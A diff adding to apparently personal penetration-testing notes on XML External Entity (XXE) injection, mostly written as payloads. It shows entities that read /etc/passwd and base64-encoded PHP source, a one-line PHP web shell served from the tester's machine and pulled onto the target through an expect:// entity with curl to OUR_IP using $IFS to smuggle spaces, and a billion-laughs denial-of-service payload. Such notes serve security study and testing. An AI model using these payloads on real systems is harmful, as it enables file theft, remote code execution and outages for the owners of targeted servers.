@@ -63,3 +63,59 @@
   ]>
   ```
   - also use the PUBLIC keyword instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards
+
+- Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
+  ##### Reading Sensitive Files
+  ```
+  <!DOCTYPE email [
+  <!ENTITY company SYSTEM "file:///etc/passwd">
+  ]>
+  ```
+  ##### Reading Source Code
+  ```
+  <!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+  ]>
+  ```
+  ##### Remote Code Execution with XXE
+  ```
+  $ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
+  $ sudo python3 -m http.server 80
+  ```
+  ```
+  <?xml version="1.0"?>
+  <!DOCTYPE email [
+    <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
+  ]>
+  <root>
+  <name></name>
+  <tel></tel>
+  <email>&company;</email>
+  <message></message>
+  </root>
+  ```
+    - replaced all spaces in the above XML code with $IFS to avliid breaking
+  ##### Billon laugh
+  ```
+  <?xml version="1.0"?>
+  <!DOCTYPE email [
+    <!ENTITY a0 "DOS" >
+    <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
+    <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
+    <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
+    <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
+    <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
+    <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
+    <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
+    <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
+    <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
+    <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
+  ]>
+  <root>
+  <name></name>
+  <tel></tel>
+  <email>&a10;</email>
+  <message></message>
+  </root>
+  ```
+   - However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference
